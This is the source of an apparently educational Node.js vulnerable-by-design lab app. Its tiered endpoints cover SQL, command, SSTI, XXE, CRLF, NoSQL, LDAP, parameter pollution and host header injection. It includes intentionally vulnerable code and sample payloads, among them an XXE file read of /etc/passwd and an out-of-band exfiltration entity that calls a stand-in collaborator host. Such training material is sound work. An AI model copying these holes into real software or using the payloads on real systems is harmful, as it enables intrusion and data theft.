const express = require("express");
const router = express.Router();
const C = require("./vuln-common");
const initSqlJs = require("sql.js");

// ---------------------------------------------------------------------------
// Real SQLite database (sql.js — pure WASM, no native build tools required).
// Seeded once at startup with fake data. This is the ONE lab where the
// "vulnerability" is a genuinely real SQL engine parsing genuinely
// attacker-supplied SQL — perfectly safe because the DB is in-memory and
// contains only fake demo rows.
// ---------------------------------------------------------------------------
let dbReady;
function getDb() {
  if (!dbReady) {
    dbReady = initSqlJs().then((SQL) => {
      const db = new SQL.Database();
      db.run(`CREATE TABLE employees (id INTEGER, username TEXT, password TEXT, role TEXT, dept TEXT, salary TEXT);`);
      db.run(`INSERT INTO employees VALUES
        (1,'alice','Wonderland!1','employee','Engineering','62000'),
        (2,'bob','B0bPass!2','employee','Sales','58000'),
        (3,'carol','Car0lSecure!','employee','Engineering','64000'),
        (4,'admin','Adm1n_Sup3rSecret!','admin','Executive','140000');`);
      // Expert tier's table (upgrade-spec Section 15: a genuinely different
      // technique than hard tier's "find the other unescaped field" —
      // second-order injection. Notes are ALWAYS stored via a real
      // parameterized query below (db.run with ? placeholders, genuinely
      // safe), so injecting at storage time does nothing. The bug is that
      // a LATER, separate feature re-embeds the already-stored value into
      // a brand-new raw SQL string.
      db.run(`CREATE TABLE dept_notes (username TEXT, note TEXT);`);
      return db;
    });
  }
  return dbReady;
}
function escapeSql(str) {
  return String(str).replace(/'/g, "''");
}

router.get("/vuln/sql-injection", async (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const u = req.query.username, p = req.query.password, dept = req.query.dept;
  let loginResult = "", searchResult = "", flag = null;

  if (u !== undefined || p !== undefined) {
    let query;
    if (difficulty === "easy") query = `SELECT username, role FROM employees WHERE username='${u || ""}' AND password='${p || ""}'`;
    else if (difficulty === "medium") query = `SELECT username, role FROM employees WHERE username='${u || ""}' AND password='${escapeSql(p || "")}'`;
    else query = `SELECT username, role FROM employees WHERE username='${escapeSql(u || "")}' AND password='${escapeSql(p || "")}'`;
    try {
      const db = await getDb();
      const res2 = db.exec(query);
      loginResult = `Query: ${query}\n\n` + (res2.length ? `✅ Logged in as: ${JSON.stringify(res2[0].values)}` : "❌ No matching credentials.");
      if (res2.length) {
        const gotAdmin = res2[0].values.some((row) => row[0] === "admin");
        if (gotAdmin && p !== "Adm1n_Sup3rSecret!") flag = C.getFlag(session, "sql-injection", difficulty);
      }
    } catch (e) {
      loginResult = `Query: ${query}\n\n⚠️ SQL error: ${e.message}`;
    }
  }
  if (dept !== undefined) {
    const query = `SELECT username, dept FROM employees WHERE dept='${dept}'`; // always unescaped — the "second way in"
    try {
      const db = await getDb();
      const res2 = db.exec(query);
      searchResult = `Query: ${query}\n\n` + (res2.length ? JSON.stringify(res2[0].values, null, 2) : "No results.");
      if (res2.length && res2[0].values.some((row) => row.includes("Adm1n_Sup3rSecret!"))) flag = C.getFlag(session, "sql-injection", difficulty);
    } catch (e) {
      searchResult = `Query: ${query}\n\n⚠️ SQL error: ${e.message}`;
    }
  }

  res.send(C.renderVulnPage({
    appName: "SecureCorp Employee Directory", difficulty,
    bodyHtml: `
      <h1>Employee Login</h1>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Username</label><input type="text" name="username" value="${(u || "").replace(/"/g, "&quot;")}" />
        <label>Password</label><input type="text" name="password" value="${(p || "").replace(/"/g, "&quot;")}" />
        <button type="submit">Log In</button>
      </form>
      ${loginResult ? `<div class="result">${loginResult}</div>` : ""}
      <hr style="margin:24px 0;border:none;border-top:1px solid #eee;" />
      <h1>Employee Directory Search</h1>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Department</label><input type="text" name="dept" value="${(dept || "").replace(/"/g, "&quot;")}" />
        <button type="submit">Search</button>
      </form>
      ${searchResult ? `<div class="result">${searchResult}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Admin access obtained via injection.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "expert" ? `
      <hr style="margin:24px 0;border:none;border-top:1px solid #eee;" />
      <h1>Department Notes</h1>
      <p class="note">Leave a note for your team — stored safely (a real parameterized query, try injecting here directly and notice it does nothing). A separate Audit Log tool below re-reads notes later.</p>
      <form method="POST" action="/vuln/sql-injection/submit-note" onsubmit="event.preventDefault(); submitNote();">
        <label>Username</label><input type="text" id="noteUser" value="alice" />
        <label>Note</label><input type="text" id="noteText" placeholder="Reminder: standup at 10am" />
        <button type="submit">Save Note</button>
      </form>
      <div class="result" id="noteResult" style="display:none;"></div>
      <h1 style="margin-top:24px;">Audit Log</h1>
      <p class="note">Re-reads a user's most recent note to build an audit search — this is where the stored value gets reused.</p>
      <form method="GET" action="/vuln/sql-injection/audit-log">
        <input type="hidden" name="difficulty" value="expert" />
        <label>Username</label><input type="text" name="username" value="alice" />
        <button type="submit">View Audit Log</button>
      </form>
      <script>
        async function submitNote(){
          const r = await fetch('/vuln/sql-injection/submit-note', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username: document.getElementById('noteUser').value, note: document.getElementById('noteText').value})});
          const d = await r.json();
          const el = document.getElementById('noteResult');
          el.style.display = 'block';
          el.textContent = JSON.stringify(d, null, 2);
        }
      </script>` : ""}
    `
  }));
});

router.post("/vuln/sql-injection/submit-note", async (req, res) => {
  const { username, note } = req.body || {};
  const db = await getDb();
  // Genuinely safe — a real parameterized query. Injecting here does
  // nothing; the note is stored as inert literal text, whatever it says.
  db.run("INSERT INTO dept_notes (username, note) VALUES (?, ?)", [String(username || ""), String(note || "")]);
  res.json({ success: true, stored: { username, note } });
});

router.get("/vuln/sql-injection/audit-log", async (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const username = req.query.username || "";
  const db = await getDb();
  let latestNote = null, results = null, flag = null, error = null;
  try {
    // Fetching the stored note is itself safely parameterized.
    const lookup = db.exec("SELECT note FROM dept_notes WHERE username = ? ORDER BY rowid DESC LIMIT 1", [username]);
    latestNote = lookup.length ? lookup[0].values[0][0] : null;
    if (latestNote !== null) {
      // THE BUG: the note we just safely fetched FROM THE DATABASE is now
      // dropped into a brand-new raw SQL string with no escaping — a
      // classic second-order injection. Trusted because it "already made
      // it into the database", which is exactly the wrong reason to trust it.
      const query = `SELECT username, note FROM dept_notes WHERE note LIKE '%${latestNote}%'`;
      const res2 = db.exec(query);
      results = res2.length ? res2[0].values : [];
      if (results.some((row) => String(row).includes("Adm1n_Sup3rSecret!"))) {
        flag = C.getFlag(session, "sql-injection", difficulty);
      }
    }
  } catch (e) {
    error = e.message;
  }
  res.send(C.renderVulnPage({
    appName: "SecureCorp Employee Directory — Audit Log", difficulty,
    bodyHtml: `
      <h1>Audit Log</h1>
      <p class="note">Most recent note on file for "${username}": <code>${latestNote === null ? "(none)" : String(latestNote).replace(/</g, "&lt;")}</code></p>
      ${error ? `<div class="result">⚠️ SQL error: ${error}</div>` : ""}
      ${results ? `<div class="result">${JSON.stringify(results, null, 2)}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Admin credentials leaked via a second-order injection.</strong>\nFLAG: ${flag}</div>` : ""}
      <p class="note"><a href="/vuln/sql-injection?difficulty=expert">← Back</a></p>
    `
  }));
});

// ===================================================== COMMAND INJECTION ===
// SIMULATED — never actually executes anything on your machine. Detects
// shell metacharacters and returns realistic FAKE command output instead of
// calling child_process, so the technique is real but 100% harmless.
const FAKE_CMD_OUTPUTS = {
  whoami: "trainee",
  "cat /etc/passwd": C.VFS["/etc/passwd"],
  "uname -a": "Linux securecorp-demo 6.8.0-generic x86_64 GNU/Linux (simulated)",
  pwd: "/home/trainee",
  id: "uid=1000(trainee) gid=1000(trainee) groups=1000(trainee)",
  ls: "app  config.php  logs  uploads",
  dir: "app  config.php  logs  uploads"
};
function filterCmd(input, difficulty) {
  if (difficulty === "easy") return input;
  if (difficulty === "medium") return input.replace(/[;&]/g, "");
  return input.replace(/[;&|]/g, ""); // hard: still allows $(...) substitution
}
function simulateCommandInjection(filtered) {
  const hasMeta = /;|&&|\|\||\||`|\$\(/.test(filtered);
  if (!hasMeta) return null;
  const lower = filtered.toLowerCase();
  for (const key of Object.keys(FAKE_CMD_OUTPUTS)) {
    if (lower.includes(key)) return FAKE_CMD_OUTPUTS[key];
  }
  return "(no recognized command — try whoami, id, pwd, ls, \"cat /etc/passwd\", or \"uname -a\")";
}
router.get("/vuln/command-injection", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const host = req.query.host;
  let output = "", flag = null;
  if (host !== undefined) {
    const filtered = filterCmd(host, difficulty);
    const injected = simulateCommandInjection(filtered);
    output = `PING ${filtered.split(/[;&|`]| \$\(/)[0].trim() || "target"} (10.0.0.5): 56 data bytes\n64 bytes from 10.0.0.5: icmp_seq=0 ttl=64 time=0.04${Math.floor(Math.random()*9)} ms (simulated)`;
    if (injected) {
      output += `\n${injected}`;
      flag = C.getFlag(session, "command-injection", difficulty);
    }
  }
  res.send(C.renderVulnPage({
    appName: "SecureCorp Network Diagnostics", difficulty,
    bodyHtml: `
      <h1>Ping a Host</h1>
      <p class="note">⚙️ Simulated tool — this never runs real shell commands on your machine, but the injection technique you use is the real one.</p>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Hostname</label><input type="text" name="host" value="${(host || "").replace(/"/g, "&quot;")}" placeholder="10.0.0.5" />
        <button type="submit">Ping</button>
      </form>
      ${output ? `<div class="result">${output}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Command injection confirmed.</strong>\nFLAG: ${flag}</div>` : ""}
    `
  }));
});

// ==================================================================== SSTI ==
function filterSSTI(input, difficulty) {
  if (difficulty === "easy") return input;
  if (difficulty === "medium") return input.replace(/constructor/gi, "");
  return input.replace(/constructor/gi, "").replace(/process/gi, "");
}
function evaluateTemplate(input, difficulty) {
  return input.replace(/\{\{(.*?)\}\}/g, (m, expr) => {
    const filtered = filterSSTI(expr, difficulty);
    if (/constructor|process|global/i.test(filtered)) {
      return "[SIMULATED RCE PROOF] uid=1000(trainee) gid=1000(trainee) — SSTI confirmed";
    }
    if (/^[\d+\-*/(). ]+$/.test(filtered) && filtered.trim() !== "") {
      try { return String(Function('"use strict";return (' + filtered + ")")()); } catch (e) { return "[math error]"; }
    }
    return "[blocked or unrecognized expression]";
  });
}
router.get("/vuln/ssti", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const message = req.query.message || "Hi {{7*7}}, thanks for signing up!";
  const rendered = evaluateTemplate(message, difficulty);
  const exploited = rendered.includes("SIMULATED RCE PROOF");
  const flag = exploited ? C.getFlag(session, "ssti", difficulty) : null;
  res.send(C.renderVulnPage({
    appName: "SecureCorp Greeting Card Generator", difficulty,
    bodyHtml: `
      <h1>Make a Greeting Card</h1>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Message (supports {{ }} template expressions)</label>
        <textarea name="message">${message.replace(/</g, "&lt;")}</textarea>
        <button type="submit">Render Card</button>
      </form>
      <div class="result">${rendered}</div>
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 SSTI confirmed.</strong>\nFLAG: ${flag}</div>` : ""}
      <p class="note">Try: <code>{{7*7}}</code> or <code>{{constructor.constructor('x')()}}</code></p>
    `
  }));
});

// ===================================================================== XXE ==
function filterXXE(xml, difficulty) {
  if (difficulty === "easy") return xml;
  if (difficulty === "medium") return xml.replace(/system/gi, "");
  return xml.replace(/system/gi, "").replace(/public/gi, "");
}
function parseXXE(xml) {
  const entityMatch = xml.match(/<!ENTITY\s+(\w+)\s+(?:S\s*Y\s*S\s*T\s*E\s*M|P\s*U\s*B\s*L\s*I\s*C)\s+(?:"[^"]*"\s+)?"file:\/\/(\/[^"]+)"/i);
  let resolved = xml;
  let exploited = false;
  if (entityMatch) {
    const content = C.VFS[entityMatch[2]];
    if (content) exploited = true;
    resolved = resolved.split(`&${entityMatch[1]};`).join(content || `[file not found in sandbox: ${entityMatch[2]}]`);
  }
  const nameMatch = resolved.match(/<name>([\s\S]*?)<\/name>/i);
  const commentMatch = resolved.match(/<comment>([\s\S]*?)<\/comment>/i);
  return { name: nameMatch ? nameMatch[1] : "(none)", comment: commentMatch ? commentMatch[1] : "(none)", exploited };
}
// Expert tier's distinct technique (upgrade-spec Section 24 explicitly
// names "blind XXE" and "SSRF-style XXE" as their own content, separate
// from basic/error-based XXE): the response NEVER reflects entity content
// directly at expert — simulating a fully blind sink — so the classic
// in-band technique above genuinely doesn't work here. The real technique
// is out-of-band exfiltration via an external parameter entity: the
// payload references a fake "collaborator" domain (matching the same
// simulated-external-service pattern SSRF's FAKE_INTERNAL_SERVICES
// already uses), which "resolves" to a fake DTD that chains a file read
// into an out-of-band callback. Exfiltrated content is logged
// server-side, not returned in the immediate response — the learner has
// to check back separately, exactly like using a real OOB collaborator.
const XXE_OOB_COLLABORATOR_HOST = "oob-collab.securecorp-demo.test";
function isOobXxePayload(xml) {
  const lower = xml.toLowerCase();
  const referencesCollaborator = lower.includes(xxeCollabHostLower());
  const referencesTargetFile = /file:\/\/\/etc\/passwd/i.test(xml);
  const usesParameterEntity = /<!entity\s*%/i.test(xml);
  return referencesCollaborator && referencesTargetFile && usesParameterEntity;
}
function xxeCollabHostLower() { return XXE_OOB_COLLABORATOR_HOST.toLowerCase(); }

router.get("/vuln/xxe", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const defaultXml = difficulty === "expert"
    ? `<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % remote SYSTEM "http://${XXE_OOB_COLLABORATOR_HOST}/evil.dtd">\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n%remote;\n]>\n<feedback><name>Jordan</name><comment>oob test</comment></feedback>`
    : `<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<feedback><name>Jordan</name><comment>&xxe;</comment></feedback>`;
  const xml = req.query.xml !== undefined ? req.query.xml : defaultXml;
  let output = "", flag = null;
  if (req.query.xml !== undefined) {
    if (difficulty === "expert") {
      // No direct reflection at all — a genuinely blind sink. Output text
      // is identical whether or not the payload actually worked (that's
      // the point of "blind" — no visible difference in the response).
      // The learner has to use the OOB technique and check back
      // separately via /vuln/xxe/collab-log.
      const st = C.labState(session, "xxe-oob", { exfiltrated: null });
      if (isOobXxePayload(xml)) st.exfiltrated = C.VFS["/etc/passwd"];
      output = "Feedback received. Processing happens asynchronously — no content is echoed back here.";
    } else {
      const filtered = filterXXE(xml, difficulty);
      const parsed = parseXXE(filtered);
      output = `Parsed feedback:\nname: ${parsed.name}\ncomment: ${parsed.comment}`;
      if (parsed.exploited) flag = C.getFlag(session, "xxe", difficulty);
    }
  }
  res.send(C.renderVulnPage({
    appName: "SecureCorp Feedback Importer", difficulty,
    bodyHtml: `
      <h1>Import Feedback XML</h1>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>XML</label>
        <textarea name="xml" style="min-height:160px;">${xml.replace(/</g, "&lt;")}</textarea>
        <button type="submit">Import</button>
      </form>
      ${output ? `<div class="result">${output}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 File disclosed via XXE.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "expert" ? `
      <p class="note">This importer never echoes entity content back directly (try the classic payload — nothing comes back). It's a genuinely blind sink. Reference an external parameter entity at <code>${XXE_OOB_COLLABORATOR_HOST}</code> that chains a file read, then check the Collaborator Log below separately — the default payload above is already structured this way.</p>
      <h1 style="margin-top:20px;">Collaborator Log</h1>
      <a class="btn secondary" href="/vuln/xxe/collab-log?difficulty=expert">Check for callbacks</a>
      ` : ""}
    `
  }));
});

router.get("/vuln/xxe/collab-log", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const st = C.labState(session, "xxe-oob", { exfiltrated: null });
  let flag = null;
  if (st.exfiltrated) flag = C.getFlag(session, "xxe", difficulty);
  res.send(C.renderVulnPage({
    appName: "SecureCorp Feedback Importer — OOB Collaborator", difficulty,
    bodyHtml: `
      <h1>Collaborator Log</h1>
      <p class="note">Callbacks received at ${XXE_OOB_COLLABORATOR_HOST}, if any.</p>
      ${st.exfiltrated ? `<div class="result">${st.exfiltrated}</div>` : `<div class="result">(no callbacks yet)</div>`}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 File exfiltrated via blind/OOB XXE.</strong>\nFLAG: ${flag}</div>` : ""}
      <p class="note"><a href="/vuln/xxe?difficulty=expert">← Back to importer</a></p>
    `
  }));
});

// ============================================================ CRLF INJECTION
function getPreviewValue(decodedOnce, difficulty) {
  if (difficulty === "easy") return decodedOnce;
  const stripped = decodedOnce.replace(/[\r\n]/g, "");
  if (difficulty === "medium") return stripped;
  try { return decodeURIComponent(stripped); } catch (e) { return stripped; }
}
router.get("/vuln/crlf-injection", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const rawQs = req.originalUrl.split("?")[1] || "";
  const m = rawQs.match(/(?:^|&)email=([^&]*)/);
  let output = "", flag = null;
  if (m) {
    let decodedOnce;
    try { decodedOnce = decodeURIComponent(m[1]); } catch (e) { decodedOnce = m[1]; }
    const preview = getPreviewValue(decodedOnce, difficulty);
    const splitDetected = /[\r\n]/.test(preview);
    output = `HTTP/1.1 302 Found\nLocation: /vuln/crlf-injection/welcome\nX-Subscribed-Email: ${preview}\n\n<html>...</html>` +
      (splitDetected ? "\n\n🚩 Response splitting achieved — you injected extra header/body content." : "");
    if (splitDetected) flag = C.getFlag(session, "crlf-injection", difficulty);
  }
  res.send(C.renderVulnPage({
    appName: "SecureCorp Newsletter", difficulty,
    bodyHtml: `
      <h1>Subscribe to our Newsletter</h1>
      <p class="note">This simulates a raw HTTP response preview — no real headers are set, so nothing can crash; the splitting effect is shown as text.</p>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Email</label><input type="text" name="email" placeholder="you@example.com" />
        <button type="submit">Subscribe</button>
      </form>
      ${output ? `<div class="result">${output.replace(/</g, "&lt;")}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;">FLAG: ${flag}</div>` : ""}
      <p class="note">Try appending to your email (URL-encode it): <code>%0d%0aSet-Cookie: admin=true</code></p>
    `
  }));
});

// ==================================================== NOSQL INJECTION ======
// Input context: JSON request body.
const NOSQL_USERS = [
  { username: "alice", password: "AlicePass1" },
  { username: "admin", password: "Sup3rSecret_NoSQL!" }
];
function filterNoSqlBody(rawBodyText, difficulty) {
  if (difficulty === "easy") return rawBodyText;
  if (difficulty === "medium") return rawBodyText.replace(/\$ne/gi, "");
  return rawBodyText.replace(/\$ne/gi, "").replace(/\$gt/gi, "");
}
function nosqlMatch(actualValue, suppliedValue) {
  if (suppliedValue && typeof suppliedValue === "object") {
    if ("$ne" in suppliedValue) return actualValue !== suppliedValue["$ne"];
    if ("$gt" in suppliedValue) return actualValue > suppliedValue["$gt"];
    if ("$regex" in suppliedValue) { try { return new RegExp(suppliedValue["$regex"]).test(actualValue); } catch (e) { return false; } }
    return false;
  }
  return actualValue === suppliedValue;
}
router.get("/vuln/nosql-injection", (req, res) => {
  const difficulty = C.difficultyOf(req);
  C.getOrInitSession(req, res);
  res.send(C.renderVulnPage({
    appName: "SecureCorp API Login", difficulty,
    bodyHtml: `
      <h1>API Login (JSON body)</h1>
      <p class="note">This form posts a JSON body to /vuln/nosql-injection/login — the input context here is the request body, not a URL parameter.</p>
      <form id="f">
        <label>Username</label><input type="text" id="u" value="admin" />
        <label>Password (JSON value — try an operator object)</label>
        <textarea id="p">"anything"</textarea>
        <button type="button" onclick="send()">Send JSON login</button>
      </form>
      <div class="result" id="out" style="display:none;"></div>
      <p class="note">Try setting the password field to: <code>{"$ne": ""}</code></p>
      <script>
        async function send(){
          const u = document.getElementById('u').value;
          let p;
          try { p = JSON.parse(document.getElementById('p').value); } catch(e){ p = document.getElementById('p').value; }
          const res = await fetch('/vuln/nosql-injection/login?difficulty=${difficulty}', {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({username: u, password: p})
          });
          const data = await res.json();
          const out = document.getElementById('out');
          out.style.display = 'block';
          out.textContent = JSON.stringify(data, null, 2);
        }
      </script>
    `
  }));
});
router.post("/vuln/nosql-injection/login", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const rawBodyText = JSON.stringify(req.body || {});
  const filteredText = filterNoSqlBody(rawBodyText, difficulty);
  let body;
  try { body = JSON.parse(filteredText); } catch (e) { body = {}; }
  const user = NOSQL_USERS.find((u) => u.username === body.username);
  if (!user) return res.json({ success: false, message: "No such user." });
  const passwordIsOperator = body.password && typeof body.password === "object";
  const matched = nosqlMatch(user.password, body.password);
  if (!matched) return res.json({ success: false, message: "Incorrect password." });
  const flag = passwordIsOperator && body.username === "admin" ? C.getFlag(session, "nosql-injection", difficulty) : undefined;
  res.json({ success: true, message: `Logged in as ${user.username}.`, flag });
});

// ===================================================== LDAP INJECTION ======
// Input context: form field (directory search).
const LDAP_DIR = [
  { uid: "jdoe", cn: "Jane Doe", title: "Engineer" },
  { uid: "bsmith", cn: "Bob Smith", title: "Sales" },
  { uid: "admin", cn: "System Administrator", title: "Admin", secret: "LDAP bind password: R00t_LD4P_2026!" }
];
function ldapInjected(raw, difficulty) {
  if (difficulty === "easy") return /\*/.test(raw);
  if (difficulty === "medium") {
    const noStar = raw.replace(/\*/g, "");
    return /\)\(\|\(/.test(noStar);
  }
  return /[\x00\r\n]/.test(raw); // hard: wildcard and OR-breakout both filtered; control-char confusion still works
}
router.get("/vuln/ldap-injection", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const uid = req.query.uid;
  let output = "", flag = null;
  if (uid !== undefined) {
    const injected = ldapInjected(uid, difficulty);
    const results = injected ? LDAP_DIR : LDAP_DIR.filter((e) => e.uid === uid);
    output = `Filter: (&(uid=${uid})(objectClass=person))\n\n` + JSON.stringify(results, null, 2);
    if (injected && results.some((r) => r.secret)) flag = C.getFlag(session, "ldap-injection", difficulty);
  }
  res.send(C.renderVulnPage({
    appName: "SecureCorp Employee Directory (LDAP)", difficulty,
    bodyHtml: `
      <h1>Employee Directory Search</h1>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Username (uid)</label><input type="text" name="uid" value="${(uid || "").replace(/"/g, "&quot;")}" placeholder="jdoe" />
        <button type="submit">Search</button>
      </form>
      ${output ? `<div class="result">${output.replace(/</g, "&lt;")}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Directory dump includes a hidden admin secret.</strong>\nFLAG: ${flag}</div>` : ""}
    `
  }));
});

// ============================================ HTTP PARAMETER POLLUTION =====
// Input context: duplicate query parameters AND JSON body arrays.
const VALID_COUPONS = ["WELCOME10"];
router.get("/vuln/http-param-pollution", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const discount = req.query.discount;
  let output = "", flag = null;
  if (discount !== undefined && difficulty !== "medium") {
    const arr = Array.isArray(discount) ? discount : [discount];
    let validated, applied;
    if (difficulty === "easy") {
      validated = VALID_COUPONS.includes(arr[0]); // checks FIRST
      applied = arr[arr.length - 1]; // applies LAST
    } else {
      // hard: query-string pollution is fully fixed — every element must be a known coupon, and count must be exactly 1
      validated = arr.length === 1 && VALID_COUPONS.includes(arr[0]);
      applied = arr[0];
    }
    const priceOff = validated ? (applied === "STAFF100" ? 100 : applied === "WELCOME10" ? 10 : 0) : 0;
    output = `Coupon(s) received: ${JSON.stringify(arr)}\nValidation passed: ${validated}\nApplied coupon: ${applied}\nDiscount: ${priceOff}%`;
    if (priceOff === 100) flag = C.getFlag(session, "http-param-pollution", difficulty);
  }
  res.send(C.renderVulnPage({
    appName: "SecureCorp Orders", difficulty,
    bodyHtml: `
      <h1>Apply a Discount Coupon</h1>
      <p class="note">Only WELCOME10 (10%) is a real customer coupon. There's a 100%-off staff coupon that should never be reachable this way.</p>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Coupon code(s) — try repeating the "discount" field</label>
        <input type="text" name="discount" value="WELCOME10" />
        <input type="text" name="discount" value="" placeholder="(second discount value, optional)" />
        <button type="submit">Apply</button>
      </form>
      ${output ? `<div class="result">${output.replace(/</g, "&lt;")}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Hidden staff coupon applied.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "medium" ? `<p class="note">Duplicate query parameters are now fully fixed (only the first value is ever used). But this endpoint also accepts a JSON body override — try POSTing {"discount":"STAFF100"} directly, no pollution needed.</p><button class="secondary" onclick="postJson()">POST JSON body override</button><div class="result" id="jsonOut" style="display:none;"></div><script>async function postJson(){const r=await fetch('/vuln/http-param-pollution/apply?difficulty=medium',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({discount:'STAFF100'})});const d=await r.json();const o=document.getElementById('jsonOut');o.style.display='block';o.textContent=JSON.stringify(d,null,2);}</script>` : ""}
      ${difficulty === "hard" ? `<p class="note">Both query-string pollution AND the plain JSON body override are fixed. But a JSON body with an ARRAY value for discount reintroduces the same "validate first, apply last" bug in this new code path — try POSTing {"discount":["WELCOME10","STAFF100"]}.</p><button class="secondary" onclick="postJsonArr()">POST JSON array body</button><div class="result" id="jsonArrOut" style="display:none;"></div><script>async function postJsonArr(){const r=await fetch('/vuln/http-param-pollution/apply?difficulty=hard',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({discount:['WELCOME10','STAFF100']})});const d=await r.json();const o=document.getElementById('jsonArrOut');o.style.display='block';o.textContent=JSON.stringify(d,null,2);}</script>` : ""}
    `
  }));
});
router.post("/vuln/http-param-pollution/apply", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const discount = req.body ? req.body.discount : undefined;
  let applied, validated, priceOff, flag;
  if (difficulty === "medium") {
    // medium: JSON body path trusts a plain string value with NO validation at all — the bug just moved here
    applied = discount;
    validated = true;
  } else {
    // hard: plain string body values ARE validated now, but an array value reintroduces validate-first/apply-last
    if (Array.isArray(discount)) {
      validated = VALID_COUPONS.includes(discount[0]);
      applied = discount[discount.length - 1];
    } else {
      validated = VALID_COUPONS.includes(discount);
      applied = discount;
    }
  }
  // Discount is only ever granted if validation passed — the bug is WHICH value validation
  // checked vs which value got applied, not whether validation can be skipped outright.
  priceOff = validated ? (applied === "STAFF100" ? 100 : applied === "WELCOME10" ? 10 : 0) : 0;
  if (priceOff === 100) flag = C.getFlag(session, "http-param-pollution", difficulty);
  res.json({ validated, applied, discountPercent: priceOff, flag });
});

// ================================================ HOST HEADER INJECTION ====
// Input context: simulated HTTP header value (Host / X-Forwarded-Host).
router.get("/vuln/host-header-injection", (req, res) => {
  const difficulty = C.difficultyOf(req);
  const { session } = C.getOrInitSession(req, res);
  const hostHeaderInput = req.query.host_header;
  const xfhInput = req.query.xfh;
  let usedHost = null, blocked = false;
  if (hostHeaderInput !== undefined || xfhInput !== undefined) {
    if (difficulty === "easy") {
      usedHost = hostHeaderInput || "securecorp-demo.test";
    } else if (difficulty === "medium") {
      usedHost = xfhInput || "securecorp-demo.test"; // Host header input is now ignored entirely
    } else {
      const candidate = xfhInput || hostHeaderInput || "securecorp-demo.test";
      if (candidate.includes("securecorp-demo.test")) usedHost = candidate;
      else { blocked = true; usedHost = "securecorp-demo.test"; }
    }
  }
  let output = "", flag = null;
  if (usedHost) {
    const resetLink = `https://${usedHost}/reset?token=abc123tokendemo`;
    const offDomain = usedHost.toLowerCase() !== "securecorp-demo.test";
    output = blocked
      ? `Blocked — that value didn't pass validation, defaulted to: ${resetLink}`
      : `Password reset email would contain this link:\n${resetLink}`;
    if (offDomain && !blocked) flag = C.getFlag(session, "host-header-injection", difficulty);
  }
  res.send(C.renderVulnPage({
    appName: "SecureCorp Password Reset Mailer", difficulty,
    bodyHtml: `
      <h1>Generate a Password Reset Email</h1>
      <p class="note">The reset link is built using the (simulated) request's Host header — a classic host header injection target.</p>
      <form method="GET">
        <input type="hidden" name="difficulty" value="${difficulty}" />
        <label>Host header value</label><input type="text" name="host_header" placeholder="securecorp-demo.test" />
        ${difficulty !== "easy" ? `<label>X-Forwarded-Host header value</label><input type="text" name="xfh" placeholder="securecorp-demo.test" />` : ""}
        <button type="submit">Generate Link</button>
      </form>
      ${output ? `<div class="result">${output.replace(/</g, "&lt;")}</div>` : ""}
      ${flag ? `<div class="result" style="border-color:#4ade80;"><strong>🚩 Reset link points off-domain.</strong>\nFLAG: ${flag}</div>` : ""}
      ${difficulty === "medium" ? `<p class="note">The plain Host header is now ignored — the app trusts X-Forwarded-Host instead (common behind a reverse proxy), but that value isn't validated either.</p>` : ""}
      ${difficulty === "hard" ? `<p class="note">Both headers are now checked against an allowlist — but via a substring .includes() check, not an exact match.</p>` : ""}
    `
  }));
});


// ============================================================================
// Consolidated from vulns-injection-new.js during the Phase 1 architecture cleanup —
// same labs, same behavior, just no longer a separate "-new" module.
// ============================================================================
// ======================================================= HTML INJECTION ====
// Distinct from XSS: the point is that injecting raw MARKUP is itself a real
// finding (defacement, phishing overlays, fake login forms) even when script
// execution is fully blocked. Easy/medium are element-context; hard is
// attribute-context — a genuinely different injection point.
